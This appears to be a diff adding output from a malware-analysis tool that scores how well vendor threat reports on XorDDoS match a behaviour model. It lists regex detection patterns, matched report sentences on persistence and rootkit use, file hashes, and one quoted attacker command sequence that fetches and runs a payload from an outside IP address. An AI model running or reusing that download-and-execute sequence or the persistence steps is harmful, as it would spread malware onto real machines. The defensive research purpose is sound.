@@ -1,0 +1,123 @@
+=== mem_usage: 211.67 MB ===
+asg_object: {'/var/', '/etc/rc', '/proc/rs_dev', '/etc/sed', 'permission(\\s|:)[0-9]{1,4}', '/perl/', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '/proc/', '/boot/[a-z]{10}', '^sh$', '^systemctl$', '/var/run/', '^chkconfig$', '/run/', '/selinux', '/etc/init.d/', '/boot/', 'bin/sed', '[a-zA-z]:\\d{1,5}$', '/etc/cron', 'bin/insserv', '\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}:\\d{1,5}$', '^pipe(\\$|\\.|$)', 'update-rc.d', '^sed$', 'bin/openrc'}
+
+
+Sample Xorddos-Cdnetworks.csv
+	num of segment in report: 32
+	lenght of ctd's OPset is 0
+	#R_malObj
+	num of ctd objects: 0, num of asg objects: 26. R_malObj is 0.0000
+		ctd_object: set()
+	#R_malSysObj
+	num of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000
+		len(asg_OPset): 73, len(ctd_OPset): 0
+	#R_malOps
+	num of matched asg op: 0, num of asg op: 73. R_malOps is 0.0000
+		refered lifecycle: []
+	#R_malChangeOps
+	num of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000
+		ref-sys lifecycle: []
+
+Sample Xorddos-Crowdstrike.csv
+	num of segment in report: 45
+	lenght of ctd's OPset is 0
+	#R_malObj
+	num of ctd objects: 0, num of asg objects: 26. R_malObj is 0.0000
+		ctd_object: set()
+	#R_malSysObj
+	num of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000
+		len(asg_OPset): 73, len(ctd_OPset): 0
+	#R_malOps
+	num of matched asg op: 0, num of asg op: 73. R_malOps is 0.0000
+		refered lifecycle: []
+	#R_malChangeOps
+	num of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000
+		ref-sys lifecycle: []
+
+Sample Xorddos-Intezer.csv
+	num of segment in report: 156
+	lenght of ctd's OPset is 7
+	#R_malObj
+	num of ctd objects: 4, num of asg objects: 26. R_malObj is 0.1538
+		ctd_object: {'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}', '/etc/init.d/', '/proc/', '/etc/rc'}
+	#R_malSysObj
+	num of ctd objects: 2, num of asg objects: 4. R_malSysObj is 0.5000
+		len(asg_OPset): 73, len(ctd_OPset): 7
+	#R_malOps
+	num of matched asg op: 2, num of asg op: 73. R_malOps is 0.0274
+		refered lifecycle: [0, 18]
+	#R_malChangeOps
+	num of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000
+		ref-sys lifecycle: []
+
+	hits
+	<OP 1 act=readlink, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key	description	comment hostip	ip	hardcoded to 127.0.0.1 softtype		hardcoded to “linux” pscaddr	mac address	 hostname	machine name	 hosttar	username	possibly “host target” hostos	distribution	extracted from /etc/issue or /etc/redhat-release hostcpu	clock speed	/proc/cpuinfo hostmem	amount of memory	/proc/meminfo hostpack		hardcoded to “linux” lkmtag	is rootkit enabled	 kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2.>
+	<OP19 act=open, obj=/proc/>, <OP 6 act=extract, obj=/proc/cpuinfo, sent=table 2: data collected by the malware and sent back to the c2 server url key	description	comment hostip	ip	hardcoded to 127.0.0.1 softtype		hardcoded to “linux” pscaddr	mac address	 hostname	machine name	 hosttar	username	possibly “host target” hostos	distribution	extracted from /etc/issue or /etc/redhat-release hostcpu	clock speed	/proc/cpuinfo hostmem	amount of memory	/proc/meminfo hostpack		hardcoded to “linux” lkmtag	is rootkit enabled	 kernel	kernel version	extracted from unamefigure 12 shows the communication between redxor and the c2.>
+
+Sample Xorddos-Ms.csv
+	num of segment in report: 252
+	lenght of ctd's OPset is 51
+	#R_malObj
+	num of ctd objects: 12, num of asg objects: 26. R_malObj is 0.4615
+		ctd_object: {'/var/', '^chkconfig$', '/etc/rc', 'update-rc.d', '/proc/rs_dev', '/run/', '/etc/init.d/', '/proc/', '^sh$', '[a-zA-z]:\\d{1,5}$', '/etc/cron', '/var/run/'}
+	#R_malSysObj
+	num of ctd objects: 3, num of asg objects: 4. R_malSysObj is 0.7500
+		len(asg_OPset): 73, len(ctd_OPset): 51
+	#R_malOps
+	num of matched asg op: 8, num of asg op: 73. R_malOps is 0.1096
+		refered lifecycle: [26, 15, 0, 50, 51, 52, 12, 67]
+	#R_malChangeOps
+	num of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000
+		ref-sys lifecycle: []
+
+	hits
+	<OP27 act=clone, obj=^chkconfig$>, <OP25 act=add, obj=chkconfig, sent=the commands chkconfig –add <service_name> and update-rc.d then add a service that starts the daemon process at boot.>
+	<OP16 act=open, obj=/etc/cron>, <OP49 act=drop, obj=/etc/cron.hourly/gcc.sh, sent= dropped files dropped file path	file type	sha-256 /etc/init.d/hflggwyfsc.elf	shell script	6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf /etc/cron.hourly/gcc.sh	shell script	cbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459 /lib/libudev.so	elf	f2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432 /run/gcc.pid	text	932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a /usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/dmpyuitfoq	elf	798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c /usr/bin/fdinprytpq	elf	2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3 /usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kagbjahdic	elf	e6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b /usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/kndmhuqmah	elf	b5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a /usr/bin/qkxqoelrfa	elf	d71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7 /usr/bin/sykhrxsazz	elf	9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489 /usr/bin/tcnszvmpqn	elf	360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd /usr/bin/zalkpggsgh	elf	dc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7 /usr/bin/zvcarxfquk	elf	175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4 /tmp/bin/3200	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea installer script	bash script	8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2 /usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/zvcarxfqul	elf (rootkit)	483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25 /usr/bin/zvzvmpqnv	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea>
+	<OP 1 act=readlink, obj=/proc/>, <OP36 act=use, obj=/proc/rs_dev, sent= xorddos uses /proc/rs_dev character device to communicate with the rootkit.>
+	<OP51 act=open, obj=/run/>, <OP50 act=drop, obj=/run/gcc.pid, sent= dropped files dropped file path	file type	sha-256 /etc/init.d/hflggwyfsc.elf	shell script	6e506f32c6fb7b5d342d1382989ab191c6f21c2d311251d8f623814f468952cf /etc/cron.hourly/gcc.sh	shell script	cbb72e542e8f19240130fc9381c2351730d437d42926c6e68e056907c8456459 /lib/libudev.so	elf	f2df54eb827f3c733d481ebb167a5bc77c5ae39a6bda7f340bb23b24dc9a4432 /run/gcc.pid	text	932feef3ab6fccb3502f900619b1f87e1cb44a7adab48f2c927ecdd67ff6830a /usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/dmpyuitfoq	elf	798577202477c0c233d4af51c4d8fb2f574ddb3c9d1d90325d359a84cb1bd51c /usr/bin/fdinprytpq	elf	2b4500987d50a24ba5c118f506f2507362d6b5c63c80b1984b4ae86641779ff3 /usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kagbjahdic	elf	e6c7eee304dfc29b19012ef6d31848c0b5bb07362691e4e9633c8581f1c2d65b /usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/kndmhuqmah	elf	b5fba27a8e457c1ab6573c378171f057d151dc615d6a8d339195716fa9ac277a /usr/bin/qkxqoelrfa	elf	d71ea3b98286d39a711b626f687f0d3fc852c3e3a05de3f51450fb8f7bd2b0d7 /usr/bin/sykhrxsazz	elf	9d6f115f31ee71089cc85b18852974e349c68fad3276145dafd0076951f32489 /usr/bin/tcnszvmpqn	elf	360a6258dd66a3ba595a93896d9b55d22406d02e5c02100e5a18382c54e7d5cd /usr/bin/zalkpggsgh	elf	dc2b1cee161ebe90be68561755d99e66f454ad80b27cebe3d4773518ac45cbb7 /usr/bin/zvcarxfquk	elf	175667933088fbebcb62c8450993422ccc876495299173c646779a9e67501ff4 /tmp/bin/3200	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea installer script	bash script	8be8c950d8701ef1149c547ea3f949ea78394787ad1e19fc0eaa7bd7aeb863c2 /usr/bin/djtctpzfdq	elf	53f062a93cf19aeaa2f8481b32118a31b658a126624abb8a7d82237884f0a394 /usr/bin/jwvwvxoupv	elf	359c41da1cbae573d2c99f7da9eeb03df135f018f6c660b4e44fbd2b4ddecd39 /usr/bin/kkldnszwvq	elf	ef0a4c12d98dc0ad4db86aadd641389c7219f57f15642ed35b4443daf3ff8c1e /usr/bin/zvcarxfqul	elf (rootkit)	483451dcda78a381cc73474711bf3fcae97bd088f67b5a7e92639df52ef5ef25 /usr/bin/zvzvmpqnv	elf (rootkit)	c8f761d3ef7cd16ebe41042a0daf901c2fdffce96c8e9e1fa0d422c6e31332ea>
+	<OP52 act=open, obj=/var/run/>, <OP30 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>
+	<OP53 act=open, obj=/var/>, <OP29 act=create, obj=/var/run/., sent=if it’s not running from these locations, then it creates and copies itself using a 10-character string name on those locations, as well as /lib/ and /var/run/.>
+	<OP13 act=open, obj=/etc/init.d/>, <OP20 act=drop, obj=/etc/init.d/hflggwyfsc.elf, sent=figure 11. content of the init script dropped at the location /etc/init.d/hflggwyfsc.elf>
+	<OP68 act=access, obj=/proc/>, <OP14 act=check, obj=/proc/$pid, sent=a user-mode process can get any process specific information by reading the /proc directory that contains the subdirectory for each running process on the system, such as:  /proc/7728 – contains process-id (pid) 7728-related information /proc/698 – contains pid 698-related information running the strace -e open ps command checks the traces of the open call on /proc/$pid to fetch information on running processes as part of the ps command.>
+
+Sample Xorddos-Trendmicro.csv
+	num of segment in report: 27
+	lenght of ctd's OPset is 6
+	#R_malObj
+	num of ctd objects: 6, num of asg objects: 26. R_malObj is 0.2308
+		ctd_object: {'/var/', '/etc/rc', '/run/', '[a-zA-z]:\\d{1,5}$', '/etc/cron', '/var/run/'}
+	#R_malSysObj
+	num of ctd objects: 2, num of asg objects: 4. R_malSysObj is 0.5000
+		len(asg_OPset): 73, len(ctd_OPset): 6
+	#R_malOps
+	num of matched asg op: 1, num of asg op: 73. R_malOps is 0.0137
+		refered lifecycle: [15]
+	#R_malChangeOps
+	num of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000
+		ref-sys lifecycle: []
+
+	hits
+	<OP16 act=open, obj=/etc/cron>, <OP 1 act=drop, obj=/etc/cron.hourly/gcc.sh, sent= this backdoor drops the following files:  /etc/cron.hourly/gcc.sh (cron is a time-based job scheduler in unix-like computer operating systems) backdoor routine>
+
+Sample Xorddos-Trendmicro2.csv
+	num of segment in report: 47
+	lenght of ctd's OPset is 2
+	#R_malObj
+	num of ctd objects: 1, num of asg objects: 26. R_malObj is 0.0385
+		ctd_object: {'\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}\\.\\d{1,3}'}
+	#R_malSysObj
+	num of ctd objects: 0, num of asg objects: 4. R_malSysObj is 0.0000
+		len(asg_OPset): 73, len(ctd_OPset): 2
+	#R_malOps
+	num of matched asg op: 1, num of asg op: 73. R_malOps is 0.0137
+		refered lifecycle: [61]
+	#R_malChangeOps
+	num of matched asg op: 0, num of asg op: 6. R_malChangeOps is 0.0000
+		ref-sys lifecycle: []
+
+	hits
+	<OP62 act=send, obj=ip_addr>, <OP 1 act=wget, obj=http://122.51.133.49:10086/vip, sent=afterwards, the attackers executed the following sequence of commands to all containers, infecting all of them with the xorddos malware:  wget http://122.51.133.49:10086/vip –o vip chmod 777 vip ./vip the xorddos payload (detected by trend micro as backdoor.linux.xorddos.ae) still used the xor-key it used in other recorded attacks, bb2fa36aaa9541f0, to encrypt its strings and to communicate with the command and control (c&c) server.>
+
+
+OperationPair that changes system resources:
+ [<OP48 act=rename, obj=/etc/cron>, <OP22 act=write, obj=/etc/rc>, <OP18 act=write, obj=/etc/cron>, <OP15 act=write, obj=/etc/init.d/>, <OP45 act=write, obj=/etc/sed>, <OP47 act=fchmod, obj=/etc/sed>]
